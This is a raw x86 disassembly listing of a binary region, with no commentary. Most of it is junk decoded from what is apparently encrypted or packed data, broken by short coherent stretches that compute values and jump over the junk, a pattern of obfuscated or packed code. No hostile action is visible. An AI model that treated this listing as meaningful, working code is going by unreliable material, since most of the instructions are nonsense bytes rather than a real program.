  40b63f:	push   edi
  40b640:	call   0x6e9c762a
  40b645:	int    0xdb
  40b647:	xor    ecx,esi
  40b649:	(bad)  
  40b64a:	stos   DWORD PTR es:[edi],eax
  40b64b:	cmp    DWORD PTR [ebx+0x7f],edi
  40b64e:	jge    0x40b6cb
  40b650:	aad    0x66
  40b652:	retf   0x1e05
  40b655:	cmp    DWORD PTR [edi],0x9be24cfd
  40b65b:	xchg   ebp,eax
  40b65c:	dec    esi
  40b65d:	fimul  WORD PTR [edx+0x2262af0c]
  40b663:	ins    DWORD PTR es:[edi],dx
  40b664:	aam    0x97
  40b666:	inc    esi
  40b667:	outs   dx,BYTE PTR ds:[esi]
  40b668:	fidivr WORD PTR [edi+0x3]
  40b66b:	push   cs
  40b66c:	mov    al,0xa1
  40b66e:	in     al,0xc6
  40b670:	mov    ax,0x7503
  40b674:	aaa    
  40b675:	int    0x71
  40b677:	pushf  
  40b678:	pop    eax
  40b679:	cmp    BYTE PTR [esi+0x44],ah
  40b67c:	dec    esi
  40b67d:	mov    ch,0x57
  40b67f:	mov    al,0xdd
  40b681:	push   cs
  40b682:	jle    0x40b6e3
  40b684:	ret    
  40b685:	sub    BYTE PTR [ebx+0x383c3d77],ah
  40b68b:	inc    ebp
  40b68c:	mov    bl,BYTE PTR [eax-0x7835423e]
  40b692:	retf   
  40b693:	push   esp
  40b694:	jnp    0x40b67d
  40b696:	iret   
  40b697:	sar    DWORD PTR fs:[edi-0x11],1
  40b69b:	(bad)  
  40b69c:	aam    0x47
  40b69e:	fisubr WORD PTR [eax+0x4d]
  40b6a1:	loop   0x40b6f9
  40b6a3:	inc    edx
  40b6a4:	cmp    dl,BYTE PTR [esi]
  40b6a6:	repz mov bl,0x77
  40b6a9:	cdq    
  40b6aa:	aad    0xfb
  40b6ac:	mov    BYTE PTR [ecx-0x53],bh
  40b6af:	push   edi
  40b6b0:	mov    eax,DWORD PTR [ebp-0x10]
  40b6b3:	mov    ecx,DWORD PTR [ebp-0x14]
  40b6b6:	xor    ecx,esi
  40b6b8:	mov    edx,0xffcd8d65
  40b6bd:	sub    edx,ecx
  40b6bf:	add    DWORD PTR [eax],edx
  40b6c1:	mov    eax,ds:0x41227c
  40b6c6:	mov    eax,DWORD PTR [eax]
  40b6c8:	jmp    0x40ba15
  40b6cd:	mov    cl,0x1a
  40b6cf:	jns    0x40b704
  40b6d1:	xchg   ecx,eax
  40b6d2:	xor    DWORD PTR [ecx+0x2f888498],esi
  40b6d8:	mov    ch,0x57
  40b6da:	daa    
  40b6db:	mov    esp,0x7ef2d925
  40b6e0:	jle    0x40b710
  40b6e2:	jge    0x40b762
  40b6e4:	jle    0x40b730
  40b6e6:	push   esp
  40b6e7:	and    al,0x3
  40b6e9:	sbb    esp,DWORD PTR [edx+eax*1+0xa8e3340]
  40b6f0:	jecxz  0x40b724
  40b6f2:	idiv   DWORD PTR [edi+0x6c02fc7a]
  40b6f8:	jge    0x40b71a
  40b6fa:	push   ebp
  40b6fb:	test   ebp,ebx
  40b6fd:	outs   dx,BYTE PTR ds:[esi]
  40b6fe:	lahf   
  40b6ff:	pushf  
  40b700:	jo     0x40b769
  40b702:	loope  0x40b741
  40b704:	in     al,dx
  40b705:	test   eax,0x5c371b52
  40b70a:	lods   eax,DWORD PTR ds:[esi]
  40b70b:	inc    esp
  40b70c:	daa    
  40b70d:	and    BYTE PTR [ebp+eax*2-0x6d81b2d2],0xc8
  40b715:	aam    0x74
  40b717:	das    
  40b718:	mov    edx,0x90894ac8
  40b71d:	mov    ebp,fs
  40b71f:	xchg   edx,eax
  40b720:	add    cl,dh
  40b722:	jmp    0x9771:0xfd64659b
  40b729:	xlat   BYTE PTR ds:[ebx]
  40b72a:	push   0xaf68de96
  40b72f:	xchg   ecx,eax
  40b730:	data16 or cl,BYTE PTR [edx]
  40b733:	pop    esp
  40b734:	push   ebx
  40b735:	jle    0x40b727
  40b737:	mov    bl,BYTE PTR [ebx+esi*1+0x65823e1]
  40b73e:	mov    ebx,0x95f77eb0
  40b743:	push   ecx
  40b744:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b745:	push   ecx
  40b746:	and    cl,BYTE PTR [edi]
  40b748:	mov    ah,0xae
  40b74a:	das    
  40b74b:	add    ch,BYTE PTR [eax]
  40b74d:	out    dx,al
  40b74e:	iret   
  40b74f:	jle    0x40b7c7
  40b751:	in     eax,dx
  40b752:	lea    ebp,[ecx-0x2a]
  40b755:	or     DWORD PTR [ecx-0x31fd3aa1],0x58
  40b75c:	push   ebp
  40b75d:	xor    esi,edx
  40b75f:	fistp  QWORD PTR [edx-0x3ffce4e4]
  40b765:	mov    edx,0x3699f738
  40b76a:	inc    BYTE PTR [ebp+0x243320d6]
  40b770:	iret   
  40b771:	aad    0xa5
  40b773:	cmp    esp,ecx
  40b775:	xor    eax,0xab4d5a3
  40b77a:	mov    ds:0x551c581c,al
  40b77f:	push   cs
  40b780:	pop    esp
  40b781:	cld    
  40b782:	lods   eax,DWORD PTR ds:[esi]
  40b783:	sub    al,0x9c
  40b785:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  40b787:	dec    edx
  40b788:	in     al,0x6a
  40b78a:	or     BYTE PTR [eax],ah
  40b78c:	dec    eax
  40b78d:	cmp    DWORD PTR [esi+0x7a2ba821],edi
  40b793:	popa   
  40b794:	hlt    
  40b795:	adc    eax,0x7dda6e2b
  40b79a:	jg     0x40b7dd
  40b79c:	int3   
  40b79d:	cmp    cl,BYTE PTR [esi]
  40b79f:	pop    ebx
  40b7a0:	mov    DWORD PTR gs:[esi-0x5bc4a8c1],edx
  40b7a7:	ror    DWORD PTR [esi+0x7041f54f],cl
  40b7ad:	mov    al,ds:0x25fe28c1
  40b7b2:	jle    0x40b751
  40b7b4:	aam    0x8c
  40b7b6:	xor    ch,BYTE PTR [esi]
  40b7b8:	inc    ebp
  40b7b9:	cmovnp esp,DWORD PTR [ebp+0x2e0f5e2a]
  40b7c0:	xor    dl,BYTE PTR [ebx]
  40b7c2:	mov    ds:0xb26cc6c2,al
  40b7c7:	jo     0x40b78e
  40b7c9:	pop    edx
  40b7ca:	mov    dl,0x5c
  40b7cc:	sub    eax,0x236ebc64
  40b7d1:	popf   
  40b7d2:	or     ebx,0xffffffe8
  40b7d5:	sbb    al,0xc9
  40b7d7:	int3   
  40b7d8:	jge    0x40b7da
  40b7da:	aad    0x8c
  40b7dc:	(bad)  
  40b7dd:	dec    eax
  40b7de:	adc    DWORD PTR [ebx+edi*2],ecx
  40b7e1:	sbb    dl,ah
  40b7e3:	push   edx
  40b7e4:	sahf   
  40b7e5:	add    BYTE PTR [edx+0x5823e2f7],0x4f
  40b7ec:	cwde   
  40b7ed:	pop    eax
  40b7ee:	mov    ecx,DWORD PTR [eax]
  40b7f0:	in     eax,0x30
  40b7f2:	adc    ebx,ebp
  40b7f4:	mov    ah,0x9f
  40b7f6:	cwde   
  40b7f7:	sbb    ebx,edi
  40b7f9:	and    esi,ebx
  40b7fb:	mov    ?,ebp
  40b7fd:	sub    BYTE PTR [eax-0x34cb3019],cl
  40b803:	or     BYTE PTR [ecx],0x68
  40b806:	and    DWORD PTR [esi+eiz*2],ebx
  40b809:	rcl    BYTE PTR [ecx-0x6d7ea354],0x3
  40b810:	pop    eax
  40b811:	repnz stc 
  40b813:	call   0x35fcab02
  40b818:	fcmove st,st(2)
  40b81a:	jle    0x40b7c8
  40b81c:	scas   al,BYTE PTR es:[edi]
  40b81d:	pop    eax
  40b81e:	mov    ecx,0x1e722a2b
  40b823:	pop    edi
  40b824:	add    BYTE PTR [ebx-0x8d778b6],dl
  40b82a:	inc    eax
  40b82b:	mov    cs,ebx
  40b82d:	and    eax,0x804046e8
  40b832:	mov    ah,0x24
  40b834:	lahf   
  40b835:	stos   BYTE PTR es:[edi],al
  40b836:	test   eax,0x7d656627
  40b83b:	sbb    BYTE PTR [edi+0x606d913a],0x53
  40b842:	mov    ds:0xfaef94a2,al
  40b847:	cmp    DWORD PTR [eax],0xb0552720
  40b84d:	fucomp st(5)
  40b84f:	stos   DWORD PTR es:[edi],eax
  40b850:	call   FWORD PTR [ebp-0x64e93d22]
  40b856:	push   ebp
  40b857:	inc    ecx
  40b858:	dec    esi
  40b859:	xchg   esi,eax
  40b85a:	cmp    ebp,DWORD PTR [ebx]
  40b85c:	repz mov ecx,0xd3cf4f2f
  40b862:	mov    edi,0x33c31028
  40b867:	js     0x40b805
  40b869:	cli    
  40b86a:	repnz jmp 0xa8fb:0x7387a888
  40b872:	add    ebx,DWORD PTR [edi-0x5b]
  40b875:	mov    al,ds:0x3febcd61
  40b87a:	cmp    BYTE PTR [eax],ch
  40b87c:	xor    bh,al
  40b87e:	dec    ebp
  40b87f:	ret    0xc2b9
  40b882:	cmp    esp,DWORD PTR ds:0x24c3d334
  40b888:	xchg   edx,eax
  40b889:	gs inc ebp
  40b88b:	add    eax,0x16fe9cd4
  40b890:	div    esi
  40b892:	jo     0x40b883
  40b894:	out    0x95,al
  40b896:	test   al,0xf2
  40b898:	cmp    BYTE PTR ss:[eax+0x2e],cl
  40b89c:	adc    al,0xc3
  40b89e:	xor    edx,esp
  40b8a0:	xchg   ebp,eax
  40b8a1:	sbb    BYTE PTR [ebp+0x4f],0x4c
  40b8a5:	mov    al,0x49
  40b8a7:	cwde   
  40b8a8:	rcr    DWORD PTR ds:0x87fe90fa,cl
  40b8ae:	inc    ebx
  40b8af:	ror    BYTE PTR [edx-0x3e],1
  40b8b2:	cdq    
  40b8b3:	mov    cl,cl
  40b8b5:	mov    bl,0x74
  40b8b7:	dec    ebx
  40b8b8:	add    al,0x7c
  40b8ba:	mov    bl,0x1b
  40b8bc:	loop   0x40b89e
  40b8be:	aaa    
  40b8bf:	adc    esi,ecx
  40b8c1:	mov    ds:0x63b4d48e,al
  40b8c6:	cwde   
  40b8c7:	test   al,0x25
  40b8c9:	jo     0x40b86a
  40b8cb:	jnp    0x40b900
  40b8cd:	sar    DWORD PTR [ebp+0x68],cl
  40b8d0:	test   bl,bl
  40b8d2:	pop    edx
  40b8d3:	mov    BYTE PTR [edi+0x1da4ab6a],cl
  40b8d9:	shr    DWORD PTR [esi],cl
  40b8db:	ror    ecx,1
  40b8dd:	xor    ch,BYTE PTR [edi]
  40b8df:	enter  0xd0a9,0xd1
  40b8e3:	push   esp
  40b8e4:	mov    eax,0x5018a575
  40b8e9:	mov    WORD PTR [esi-0x1a],?
  40b8ec:	inc    esp
  40b8ed:	pushf  
  40b8ee:	jae    0x40b89b
  40b8f0:	fs shl ebp,cl
  40b8f3:	out    dx,eax
  40b8f4:	mov    cs,WORD PTR [ebx-0x4f]
  40b8f7:	bound  esi,QWORD PTR [edi-0x13]
  40b8fa:	xchg   bl,bh
  40b8fc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b8fd:	outs   dx,BYTE PTR ds:[esi]
  40b8fe:	dec    ecx
  40b8ff:	mov    al,ds:0x781db83c
  40b904:	test   DWORD PTR [eax-0x29],0x797c6705
  40b90b:	xor    al,0x8f
  40b90d:	xor    ebp,DWORD PTR [ebp+0x5632866]
  40b913:	xchg   edi,eax
  40b914:	mov    ch,0xc5
  40b916:	jno    0x40b8d4
  40b918:	mov    edi,0x104ee444
  40b91d:	pop    ds
  40b91e:	leave  
  40b91f:	ss stc 
  40b921:	jae    0x40b973
  40b923:	xchg   ecx,eax
  40b924:	bound  eax,QWORD PTR [ebx-0x3f]
  40b927:	cmp    cl,BYTE PTR [eax+0x7a]
  40b92a:	pushf  
  40b92b:	cmp    eax,eax
  40b92d:	push   ecx
  40b92e:	xor    dl,BYTE PTR [eax]
  40b930:	mov    esi,0x828b471d
  40b935:	retf   0x3b89
  40b938:	xchg   esi,eax
  40b939:	mov    DWORD PTR [ecx],esi
  40b93b:	xchg   esp,eax
  40b93c:	or     bl,BYTE PTR [esp+ecx*4+0x76]
  40b940:	imul   ebp,DWORD PTR [edx+0x29],0x2b
  40b944:	jge    0x40b981
  40b946:	push   0xffffff94
  40b948:	or     BYTE PTR [esp+ebp*4],ah
  40b94b:	xor    bh,cl
  40b94d:	pusha  
  40b94e:	pop    ecx
  40b94f:	pop    edi
  40b950:	scas   al,BYTE PTR es:[edi]
  40b951:	or     dh,cl
  40b953:	data16 sbb BYTE PTR [eax],cl
  40b956:	popa   
  40b957:	mov    dh,0xd7
  40b959:	pop    edx
  40b95a:	push   edi
  40b95b:	mov    ch,0xe1
  40b95d:	fxtract 
  40b95f:	scas   eax,DWORD PTR es:[edi]
  40b960:	mov    dl,BYTE PTR [ecx+0x5f]
  40b963:	iret   
  40b964:	in     al,0x17
  40b966:	in     al,0x4f
  40b968:	pushf  
  40b969:	add    al,0xfd
  40b96b:	fistp  QWORD PTR [edi-0x41445736]
  40b971:	mov    edi,0x8f1fcd46
  40b976:	lds    ecx,FWORD PTR [edi+0x27]
  40b979:	cmp    al,BYTE PTR [edx]
  40b97b:	arpl   WORD PTR ds:0x4d331397,di
  40b981:	out    dx,ax
  40b983:	fbld   TBYTE PTR [eax-0x583a6d47]
  40b989:	xchg   edi,eax
  40b98a:	out    dx,al
  40b98b:	push   cx
  40b98d:	ss pop esi
  40b98f:	inc    ebp
  40b990:	in     eax,dx
  40b991:	push   edi
  40b992:	jp     0x40b9a1
  40b994:	xor    bl,BYTE PTR [edi-0x13b8a12]
  40b99a:	gs inc esp
  40b99c:	(bad)  
  40b99d:	imul   ebp,edi,0x9b469ed3
  40b9a3:	inc    eax
  40b9a4:	mov    eax,edx
  40b9a6:	fisub  DWORD PTR [edi-0x468eb44b]
  40b9ac:	jge    0x40b960
  40b9ae:	rcr    BYTE PTR [eax+0x10],0xd7
  40b9b2:	lods   al,BYTE PTR ds:[esi]
  40b9b3:	loopne 0x40b94a
  40b9b5:	xchg   edx,eax
  40b9b6:	xor    ah,0x91
  40b9b9:	shl    ebp,0x7f
  40b9bc:	loope  0x40ba19
  40b9be:	rol    DWORD PTR ds:0xc8d95880,1
  40b9c4:	(bad)  
  40b9c5:	sub    eax,0x706ba3a5
  40b9ca:	xchg   esi,eax
  40b9cb:	push   edx
  40b9cc:	mov    dl,0x10
  40b9ce:	test   DWORD PTR [edx+ebx*8],eax
  40b9d1:	leave  
  40b9d2:	cwde   
  40b9d3:	stc    
  40b9d4:	inc    ebp
  40b9d5:	sub    DWORD PTR [esi+0x31550f1c],esp
  40b9db:	or     al,0x55
  40b9dd:	je     0x40ba32
  40b9df:	push   eax
  40b9e0:	ins    BYTE PTR es:[edi],dx
  40b9e1:	xchg   edx,eax
  40b9e2:	pop    ecx
  40b9e3:	shl    DWORD PTR [ebp-0x4eeff1d7],1
  40b9e9:	push   es
  40b9ea:	mov    esi,0x252aace6
  40b9ef:	adc    ah,BYTE PTR [ebx-0x32]
  40b9f2:	sti    
  40b9f3:	inc    edi
  40b9f4:	lock push eax
  40b9f6:	out    dx,al
  40b9f7:	pop    eax
  40b9f8:	imul   edi,DWORD PTR [ecx-0x6349c22f],0xffffffb8
  40b9ff:	mov    dl,0x38
  40ba01:	xor    DWORD PTR [edx],esp
  40ba03:	or     al,0x82
  40ba05:	mov    bl,BYTE PTR [ebx-0x6]
  40ba08:	sub    BYTE PTR [eax],ch
  40ba0a:	jecxz  0x40ba8a
  40ba0c:	sbb    dl,BYTE PTR [eax]
  40ba0e:	xchg   ebp,eax
  40ba0f:	dec    esi
  40ba10:	inc    edi
  40ba11:	popf   
  40ba12:	test   eax,0x8b6664c7
  40ba17:	dec    ebp
  40ba18:	cld    
  40ba19:	movzx  ecx,cx
  40ba1c:	add    ecx,DWORD PTR [eax]
  40ba1e:	mov    DWORD PTR [ebp-0x1c],ecx
  40ba21:	mov    eax,DWORD PTR [ebp+0xc]
  40ba24:	jmp    0x40bd71
  40ba29:	jae    0x40ba29
  40ba2b:	push   ebx
  40ba2c:	lahf   
  40ba2d:	jae    0x40baa2
  40ba2f:	jae    0x40ba83
  40ba31:	pop    edi
  40ba32:	dec    ebp
  40ba33:	scas   al,BYTE PTR es:[edi]
  40ba34:	in     al,dx
  40ba35:	dec    edi
  40ba36:	adc    al,0x76
  40ba38:	icebp  
  40ba39:	mov    ecx,esi
  40ba3b:	jle    0x40babb
  40ba3d:	cs jge 0x40babe
  40ba40:	jle    0x40ba62
  40ba42:	mov    edi,0x2261dbcd
  40ba47:	xchg   ebx,eax
  40ba48:	adc    edx,DWORD PTR [ebp-0x50ce4bf7]
  40ba4e:	test   eax,0x405baf2f
  40ba53:	mov    al,0x38
  40ba55:	push   ebx
  40ba56:	and    ch,BYTE PTR [edx-0x48]
  40ba59:	mov    dl,0xde
  40ba5b:	pop    edx
  40ba5c:	fdivr  QWORD PTR [ecx-0x18c71dcc]
  40ba62:	pop    edx
  40ba63:	xchg   esi,eax
  40ba64:	int3   
  40ba65:	pop    ecx
  40ba66:	shl    edi,cl
  40ba68:	retf   0xd1bd
  40ba6b:	inc    ebx
  40ba6c:	js     0x40ba37
  40ba6e:	outs   dx,BYTE PTR ds:[esi]
  40ba6f:	pop    ds
  40ba70:	pop    ss
  40ba71:	cmc    
  40ba72:	push   ds
  40ba73:	mov    cl,0x23
  40ba75:	idiv   BYTE PTR [edi-0x43c89dec]
  40ba7b:	fidiv  DWORD PTR [edx+0x394434a2]
  40ba81:	ret    
  40ba82:	int    0x36
  40ba84:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ba85:	or     edx,esp
  40ba87:	pushf  
  40ba88:	push   cs
  40ba89:	mov    ah,0x5d
  40ba8b:	loope  0x40ba86
  40ba8d:	stos   DWORD PTR es:[edi],eax
  40ba8e:	adc    DWORD PTR [ebx],0xa62402b1
  40ba94:	and    eax,0xa9c4ae8
  40ba99:	or     eax,0x9fb3c956
  40ba9e:	adc    esi,DWORD PTR [esi]
  40baa0:	outs   dx,DWORD PTR ds:[esi]
  40baa1:	lods   al,BYTE PTR ds:[esi]
  40baa2:	xchg   ebp,eax
  40baa3:	shr    dh,0xaa
  40baa6:	lea    ecx,[ebx+0x0]
  40baa9:	xchg   esp,eax
  40baaa:	and    ah,BYTE PTR [eax+ebx*8+0x4cbec1ba]
  40bab1:	(bad)  
  40bab2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bab3:	push   ss
  40bab4:	repnz inc esp
  40bab6:	sbb    BYTE PTR [edi-0x16f91e74],ah
  40babc:	nop
  40babd:	xchg   DWORD PTR [eax+edx*8],edi
  40bac0:	or     al,0x96
  40bac2:	aad    0x2e
  40bac4:	add    al,0x87
  40bac6:	push   ds
  40bac7:	aas    
  40bac8:	mov    ds:0x768d6b4,eax
  40bacd:	imul   eax,DWORD PTR [edx],0x4f9ca4f
  40bad3:	sbb    ebx,0xffffffe1
  40bad6:	push   esi
  40bad7:	cmp    esp,DWORD PTR [eax]
  40bad9:	shl    cl,cl
  40badb:	push   esi
  40badc:	inc    esp
  40badd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bade:	fdivr  st(2),st
  40bae0:	push   0x83e45419
  40bae5:	mov    bl,0xe2
  40bae7:	mov    ah,0xe1
  40bae9:	push   0x15010102
  40baee:	loope  0x40baa9
  40baf0:	sbb    ebp,DWORD PTR [eax]
  40baf2:	xchg   esi,eax
  40baf3:	and    al,0x97
  40baf5:	lods   al,BYTE PTR ds:[esi]
  40baf6:	and    esp,ecx
  40baf8:	cmp    ch,BYTE PTR [ecx]
  40bafa:	add    al,0x82
  40bafc:	adc    eax,0xb5a419d9
  40bb01:	shl    BYTE PTR [esi+0x500457f2],1
  40bb07:	add    bl,BYTE PTR [edx*1-0x69e34dc8]
  40bb0e:	addr16 test al,0x67
  40bb11:	inc    ebx
  40bb12:	inc    esp
  40bb13:	xor    eax,0xa494280b
  40bb18:	adc    DWORD PTR [edi],0x29
  40bb1b:	int3   
  40bb1c:	js     0x40baac
  40bb1e:	fmul   QWORD PTR [ecx+0x53dd90a4]
  40bb24:	jmp    0x40bab6
  40bb26:	in     al,dx
  40bb27:	les    esi,FWORD PTR [eax+0x273ef911]
  40bb2d:	test   BYTE PTR [ecx-0x3f],bl
  40bb30:	inc    ebx
  40bb31:	mov    ebp,0xbb3b7598
  40bb36:	mov    ch,0x8
  40bb38:	push   ebp
  40bb39:	enter  0xc395,0xed
  40bb3d:	jmp    0x5cd6:0xce821217
  40bb44:	pop    ecx
  40bb45:	jb     0x40bbbf
  40bb47:	call   0x34a3:0x1308f8e2
  40bb4e:	fidivr DWORD PTR [ecx+ebp*2+0x4b9d961f]
  40bb55:	repnz adc al,0xdf
  40bb58:	dec    ebx
  40bb59:	mov    ds:0xdb68be55,al
  40bb5e:	popf   
  40bb5f:	cmc    
  40bb60:	out    dx,eax
  40bb61:	sub    BYTE PTR [ebp-0x94e812],bl
  40bb67:	mov    cl,cl
  40bb69:	cmp    edx,DWORD PTR [eax-0x71]
  40bb6c:	mov    ecx,0xf850563b
  40bb71:	adc    eax,0x7796db11
  40bb76:	lods   al,BYTE PTR ds:[esi]
  40bb77:	fcom   QWORD PTR [eax-0x62f7cc24]
  40bb7d:	mov    ebx,0x67a89bf8
  40bb82:	dec    edx
  40bb83:	cmovge eax,DWORD PTR [ebx-0x45]
  40bb87:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bb88:	clc    
  40bb89:	in     al,0xee
  40bb8b:	stos   BYTE PTR es:[edi],al
  40bb8c:	mov    WORD PTR [esi-0x5281e571],es
  40bb92:	shr    BYTE PTR [ecx],1
  40bb94:	aas    
  40bb95:	dec    ecx
  40bb96:	rcr    BYTE PTR [eax+ebp*2],0xbe
  40bb9a:	fmul   DWORD PTR [esi-0x2d045464]
  40bba0:	dec    eax
  40bba1:	xlat   BYTE PTR ds:[ebx]
  40bba2:	ins    DWORD PTR es:[edi],dx
  40bba3:	inc    edi
  40bba4:	or     al,0xf7
  40bba6:	imul   ebx,ebp,0x6ac19225
  40bbac:	fs jp  0x40bb4e
  40bbaf:	pop    DWORD PTR [ebx+0x51]
  40bbb2:	push   0xb06c8d00
  40bbb7:	or     edx,DWORD PTR [esi+0x75]
  40bbba:	lods   al,BYTE PTR ds:[esi]
  40bbbb:	push   ss
  40bbbc:	ds jo  0x40bc05
  40bbbf:	lahf   
  40bbc0:	dec    eax
  40bbc1:	push   0xf33c76a8
  40bbc6:	lahf   
  40bbc7:	rcl    DWORD PTR [eax+0x4780bb88],cl
  40bbcd:	add    ch,BYTE PTR [ecx-0x57]
  40bbd0:	push   0xffffff8f
  40bbd2:	mov    bl,0xc1
  40bbd4:	adc    al,0xc9
  40bbd6:	add    al,0xdd
  40bbd8:	rol    DWORD PTR [eax+0xc33f953],1
  40bbde:	shl    BYTE PTR [ebx],0x76
  40bbe1:	scas   eax,DWORD PTR es:[edi]
  40bbe2:	push   esi
  40bbe3:	(bad)  
  40bbe4:	data16 sub al,0x4c
  40bbe7:	push   ecx
  40bbe8:	dec    eax
  40bbe9:	jns    0x40bbac
  40bbeb:	out    dx,al
  40bbec:	xchg   edx,eax
  40bbed:	fdiv   QWORD PTR [ebx]
  40bbef:	inc    ebx
  40bbf0:	int    0x81
  40bbf2:	popf   
  40bbf3:	lahf   
  40bbf4:	js     0x40bc55
  40bbf6:	mov    ch,0x67
  40bbf8:	add    BYTE PTR [esi+0x65],bh
  40bbfb:	push   0x39
  40bbfd:	mov    esp,0x77ae3865
  40bc02:	sub    al,0x75
  40bc04:	shl    DWORD PTR [edi-0x68],1
  40bc07:	sti    
  40bc08:	enter  0xf1a2,0x5a
  40bc0c:	push   ebp
  40bc0d:	out    0x39,eax
  40bc0f:	mov    bl,0xe4
  40bc11:	jl     0x40bc2d
  40bc13:	mov    ecx,0x14b197ea
  40bc18:	lds    eax,FWORD PTR [eax-0x6ab08ebb]
  40bc1e:	mov    eax,ds:0x9646d6f9
  40bc23:	repnz dec BYTE PTR [esi-0x54072874]
  40bc2a:	mov    ss,WORD PTR [ecx+ecx*2-0x52]
  40bc2e:	ficomp WORD PTR [edi+esi*4-0x2c]
  40bc32:	fwait
  40bc33:	adc    al,bl
  40bc35:	pop    esp
  40bc36:	cdq    
  40bc37:	test   ah,al
  40bc39:	popf   
  40bc3a:	xor    BYTE PTR [ebx-0x5a77bc25],bh
  40bc40:	fiadd  DWORD PTR [ebx+0x43d5bb8b]
  40bc46:	icebp  
  40bc47:	add    eax,0xa0e10eb3
  40bc4c:	xchg   edx,eax
  40bc4d:	sub    cl,bh
  40bc4f:	and    BYTE PTR [ebp+0x259bd648],dl
  40bc55:	mov    eax,0x8ed3c6dd
  40bc5a:	sub    esp,DWORD PTR [ebp+0x47]
  40bc5d:	loope  0x40bc0d
  40bc5f:	cmp    ebx,ebx
  40bc61:	adc    edx,DWORD PTR [edx+0x4e37ac82]
  40bc67:	mov    ah,0x61
  40bc69:	push   esi
  40bc6a:	popa   
  40bc6b:	movsx  esi,bl
  40bc6e:	push   0x5f
  40bc70:	int    0xcf
  40bc72:	cld    
  40bc73:	add    eax,0x29ed3d0f
  40bc78:	and    esi,DWORD PTR [ebx+0x5eebc182]
  40bc7e:	pop    es
  40bc7f:	out    dx,al
  40bc80:	jo     0x40bcd5
  40bc82:	mov    ds:0xb78ccadf,al
  40bc87:	stos   BYTE PTR es:[edi],al
  40bc88:	js     0x40bc9c
  40bc8a:	xor    esi,edi
  40bc8c:	daa    
  40bc8d:	or     eax,0x70a8bee8
  40bc92:	and    BYTE PTR [ecx-0x21],ch
  40bc95:	add    BYTE PTR [ecx-0x2706f194],cl
  40bc9b:	dec    eax
  40bc9c:	jg     0x40bc75
  40bc9e:	lahf   
  40bc9f:	xchg   BYTE PTR [ebx],ah
  40bca1:	push   0x58
  40bca3:	inc    esp
  40bca4:	push   ebp
  40bca5:	in     al,dx
  40bca6:	cli    
  40bca7:	(bad)  
  40bca8:	je     0x40bcf1
  40bcaa:	jmp    0x40bc55
  40bcac:	inc    ebx
  40bcad:	clc    
  40bcae:	les    eax,FWORD PTR [eax*4-0xe51891a]
  40bcb5:	not    edx
  40bcb7:	xchg   dh,dh
  40bcb9:	sub    edi,DWORD PTR [edx-0x22]
  40bcbc:	mov    edi,0x8ca8d229
  40bcc1:	sbb    al,0x7d
  40bcc3:	push   esp
  40bcc4:	pop    edx
  40bcc5:	nop
  40bcc6:	fcom   DWORD PTR [eax+eiz*2+0x4b388999]
  40bccd:	add    al,0xde
  40bccf:	or     ebp,esp
  40bcd1:	sub    DWORD PTR [eax-0x21b844f8],ebp
  40bcd7:	and    ecx,DWORD PTR [esi-0x2af213c4]
  40bcdd:	sub    al,0x21
  40bcdf:	push   0xda2e87ad
  40bce4:	inc    ebx
  40bce5:	mov    fs,WORD PTR [eax+0x5a]
  40bce8:	rcr    DWORD PTR [esi+ebp*2+0x501664c3],0xa
  40bcf0:	sbb    esi,DWORD PTR [ecx+0x567241b9]
  40bcf6:	stos   DWORD PTR es:[edi],eax
  40bcf7:	xchg   ecx,eax
  40bcf8:	mov    ch,BYTE PTR [edi+0x15]
  40bcfb:	rcr    BYTE PTR [esi+0x75],0xbc
  40bcff:	loope  0x40bc86
  40bd01:	sbb    BYTE PTR [edx-0x52],ch
  40bd04:	sbb    DWORD PTR [esi],0x70cecb6c
  40bd0a:	inc    ebx
  40bd0b:	fwait
  40bd0c:	lods   al,BYTE PTR ds:[esi]
  40bd0d:	das    
  40bd0e:	fidiv  WORD PTR [ebx+0xf]
  40bd11:	dec    ebp
  40bd12:	sbb    ecx,DWORD PTR [ebp-0x268805f8]
  40bd18:	fsubr  DWORD PTR [ecx-0x31]
  40bd1b:	lods   al,BYTE PTR ds:[esi]
  40bd1c:	loopne 0x40bd3d
  40bd1e:	int    0x92
  40bd20:	hlt    
  40bd21:	pop    edi
  40bd22:	aad    0x49
  40bd24:	xchg   edx,eax
  40bd25:	add    al,0x3
  40bd27:	stos   BYTE PTR es:[edi],al
  40bd28:	pusha  
  40bd29:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bd2a:	xchg   edi,eax
  40bd2b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bd2c:	add    edi,edi
  40bd2e:	xor    BYTE PTR [edx],ch
  40bd30:	stc    
  40bd31:	mov    al,0xe7
  40bd33:	loopne 0x40bd0d
  40bd35:	fs and cl,al
  40bd38:	scas   eax,DWORD PTR es:[edi]
  40bd39:	inc    ebx
  40bd3a:	or     BYTE PTR [edi+0x6e9d5f5b],al
  40bd40:	mov    dh,0xa0
  40bd42:	sbb    ebp,esi
  40bd44:	xor    al,0xb7
  40bd46:	add    al,0xca
  40bd49:	dec    edi
  40bd4a:	xchg   DWORD PTR [eax-0x20e61305],ecx
  40bd50:	jle    0x40bd8a
  40bd52:	and    ebp,DWORD PTR [ebx-0x16]
  40bd55:	out    0x2e,al
  40bd57:	and    eax,0x3853d2b
  40bd5c:	cmc    
  40bd5d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bd5e:	jb     0x40bd01
  40bd60:	je     0x40bd61
  40bd62:	adc    eax,0x808335dc
  40bd67:	sub    eax,0xaec1afb8
  40bd6c:	xchg   ah,cl
  40bd6e:	cdq    
  40bd6f:	adc    al,0x71
  40bd71:	mov    ecx,DWORD PTR [ebp+0xc]
  40bd74:	xor    eax,esi
  40bd76:	add    eax,eax
  40bd78:	xor    ecx,esi
  40bd7a:	jmp    0x40c0c7
  40bd7f:	push   DWORD PTR [ebx-0xe4f1304]
  40bd85:	outs   dx,DWORD PTR ds:[esi]
  40bd86:	jno    0x40bd30
  40bd88:	mov    dh,0x9c
  40bd8a:	repnz sub DWORD PTR [esi],esi
  40bd8d:	mov    DWORD PTR [ecx+edi*4],ebp
  40bd90:	cld    
  40bd91:	jle    0x40be11
